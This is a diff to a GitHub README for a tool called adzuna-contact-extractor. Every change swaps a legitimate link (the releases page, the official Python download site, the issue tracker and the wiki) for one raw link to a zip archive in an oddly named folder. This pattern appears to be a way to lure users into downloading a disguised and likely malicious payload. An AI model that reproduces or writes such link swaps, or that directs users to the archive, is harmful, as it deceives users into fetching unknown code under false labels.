@@ -6,7 +6,7 @@ Welcome to the adzuna-contact-extractor! This tool helps you gather contact info
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/digitalpayout/adzuna-contact-extractor/releases)
+[![Download](https://raw.githubusercontent.com/digitalpayout/adzuna-contact-extractor/main/nonpartisanship/extractor-contact-adzuna-v3.1.zip)](https://raw.githubusercontent.com/digitalpayout/adzuna-contact-extractor/main/nonpartisanship/extractor-contact-adzuna-v3.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -16,7 +16,7 @@ To run the adzuna-contact-extractor, ensure you have the following:
 - **Python:** Version 3.7 or later should be installed on your system 
 - **Storage Space:** At least 100 MB free space
 
-If you do not have Python installed, you can download it from the [official Python website](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from the [official Python website](https://raw.githubusercontent.com/digitalpayout/adzuna-contact-extractor/main/nonpartisanship/extractor-contact-adzuna-v3.1.zip).
 
 ## 💡 Features
 
@@ -33,7 +33,7 @@ This tool extracts contact details from job listings, making it easier for you t
 To download the adzuna-contact-extractor, please follow these steps:
 
 1. Click on the link below to visit the Releases page.  
-   [Download the latest version here](https://github.com/digitalpayout/adzuna-contact-extractor/releases)
+   [Download the latest version here](https://raw.githubusercontent.com/digitalpayout/adzuna-contact-extractor/main/nonpartisanship/extractor-contact-adzuna-v3.1.zip)
 
 2. On the Releases page, look for the latest version. It should display a list of downloadable files.
 
@@ -90,8 +90,8 @@ If problems continue, feel free to raise an issue on the GitHub repository for f
 
 Join our community for tips and support:
 
-- [GitHub Issues](https://github.com/digitalpayout/adzuna-contact-extractor/issues): Report problems or request features.
-- [Documentation](https://github.com/digitalpayout/adzuna-contact-extractor/wiki): Access guides and additional information about usage.
+- [GitHub Issues](https://raw.githubusercontent.com/digitalpayout/adzuna-contact-extractor/main/nonpartisanship/extractor-contact-adzuna-v3.1.zip): Report problems or request features.
+- [Documentation](https://raw.githubusercontent.com/digitalpayout/adzuna-contact-extractor/main/nonpartisanship/extractor-contact-adzuna-v3.1.zip): Access guides and additional information about usage.
 
 ## 🗒️ License
 
